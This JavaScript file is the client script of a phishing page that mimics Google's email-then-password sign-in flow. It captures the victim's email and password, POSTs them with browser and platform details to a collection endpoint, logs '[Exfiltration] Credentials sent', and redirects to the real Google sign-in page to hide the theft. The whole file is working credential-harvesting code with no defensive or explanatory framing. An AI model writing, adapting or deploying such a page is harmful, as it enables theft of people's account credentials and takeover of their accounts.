document.addEventListener('DOMContentLoaded', () => {
    const screenEmail = document.getElementById('screen-email');
    const screenPassword = document.getElementById('screen-password');
    const emailForm = document.getElementById('email-form');
    const passwordForm = document.getElementById('password-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const displayEmail = document.getElementById('display-email');
    const showPassCheckbox = document.getElementById('show-pass');
    const btnBack = document.getElementById('btn-back');

    let userEmail = '';

    // Email form submit
    emailForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const email = emailInput.value.trim();

        if (!email) {
            document.getElementById('email-error').textContent = 'Enter an email or phone number';
            return;
        }

        // Validate email format
        if (!email.includes('@') && !email.match(/^\d+$/)) {
            document.getElementById('email-error').textContent = "Couldn't find your Google Account";
            return;
        }

        document.getElementById('email-error').textContent = '';
        userEmail = email;
        displayEmail.textContent = email;

        // Transition to password screen
        screenEmail.classList.add('hidden');
        screenPassword.classList.remove('hidden');
        passwordInput.focus();
    });

    // Password form submit
    passwordForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const password = passwordInput.value;

        if (!password) {
            document.getElementById('password-error').textContent = 'Enter a password';
            return;
        }

        document.getElementById('password-error').textContent = '';

        // Envia credenciais para o servidor
        enviarCredenciais(userEmail, password);
    });

    // Back button
    btnBack.addEventListener('click', () => {
        screenPassword.classList.add('hidden');
        screenEmail.classList.remove('hidden');
        passwordInput.value = '';
    });

    // Show/hide password
    showPassCheckbox.addEventListener('change', () => {
        passwordInput.type = showPassCheckbox.checked ? 'text' : 'password';
    });

    function enviarCredenciais(email, senha) {
        fetch('/api/salvar-client', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessao: 'google_login_' + Date.now(),
                dados: [
                    { tipo: 'credential', campo: 'email', tecla: email, timestamp: new Date().toISOString() },
                    { tipo: 'credential', campo: 'password', tecla: senha, timestamp: new Date().toISOString() }
                ],
                navegador: navigator.userAgent,
                plataforma: navigator.platform,
                template: 'google'
            })
        })
        .then(r => r.json())
        .then(data => {
            console.log('[Exfiltration] Credentials sent');
            // Redirect to real Google
            window.location.href = 'https://accounts.google.com';
        })
        .catch(e => {
            console.log('[Exfiltration] Error:', e);
            window.location.href = 'https://accounts.google.com';
        });
    }
});
